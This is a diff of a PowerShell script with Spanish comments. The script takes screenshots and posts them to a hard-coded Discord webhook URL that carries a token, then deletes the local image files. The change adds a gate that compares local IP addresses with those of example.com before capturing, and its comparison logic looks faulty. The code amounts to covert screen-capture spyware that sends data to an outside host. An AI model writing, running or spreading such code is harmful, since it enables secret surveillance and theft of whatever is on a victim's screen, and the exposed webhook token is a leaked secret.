@@ -1,3 +1,12 @@
+# Función para verificar si se está ejecutando desde un host remoto
+function IsRunningFromHost {
+    $hostName = [System.Net.Dns]::GetHostName()
+    $localHostAddresses = [System.Net.Dns]::GetHostAddresses($hostName) | Where-Object { $_.AddressFamily -eq "InterNetwork" } | ForEach-Object { $_.IPAddressToString }
+    $remoteHostAddresses = [System.Net.Dns]::GetHostAddresses("example.com") | Where-Object { $_.AddressFamily -eq "InterNetwork" } | ForEach-Object { $_.IPAddressToString }
+    
+    return ($localHostAddresses -ne $remoteHostAddresses)
+}
+
 # Definir la URL del webhook de Discord
 $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
 
@@ -30,8 +39,14 @@ function Send-ScreenshotToDiscord {
     Remove-Item -Path $fileName
 }
 
-# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
-for ($i = 1; $i -le 2; $i++) {
-    Send-ScreenshotToDiscord
-    Start-Sleep -Seconds 30
+# Verificar si se está ejecutando desde un host remoto
+if (-not (IsRunningFromHost)) {
+    # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
+    for ($i = 1; $i -le 2; $i++) {
+        Send-ScreenshotToDiscord
+        Start-Sleep -Seconds 30
+    }
+}
+else {
+    Write-Host "El script se está ejecutando desde un host remoto. No se tomarán capturas de pantalla."
 }
